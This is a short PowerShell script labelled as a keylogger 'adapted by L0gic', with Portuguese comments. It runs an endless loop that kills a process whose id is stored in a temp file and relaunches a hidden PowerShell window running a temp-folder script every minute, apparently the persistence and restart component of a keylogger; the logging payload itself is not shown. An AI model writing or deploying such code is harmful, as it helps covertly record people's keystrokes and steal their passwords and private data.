# Keylogger
# adapted by L0gic

for(;;) {
    try {
     # invoca o scritpt 
     $proc = Get-Content "$env:temp/DdBPKCytRe"
     Stop-process -id $proc -Force
     powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
    }
    catch {

    }
   
    # espera um minuto
    Start-Sleep 60
   }


